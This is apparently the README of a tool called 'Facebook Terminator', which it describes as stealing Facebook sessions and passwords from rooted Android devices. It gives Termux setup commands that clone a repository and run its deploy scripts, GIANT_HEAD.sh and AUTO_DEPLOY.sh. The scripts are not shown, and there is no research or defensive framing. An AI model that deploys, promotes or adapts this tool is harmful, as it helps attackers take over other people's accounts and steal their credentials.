# Facebook Terminator  
Steals Facebook sessions + passwords (rooted devices)  

## Setup  
1. **Install Termux** from F-Droid (Google Play version is outdated)  
2. Run these commands:  
```bash  
termux-setup-storage  
termux-change-repo  
pkg install git  
git clone https://github.com/yourusername/FB_TERMINATOR  
cd FB_TERMINATOR  
chmod +x termux/*  
./termux/GIANT_HEAD.sh  
./termux/AUTO_DEPLOY.sh  
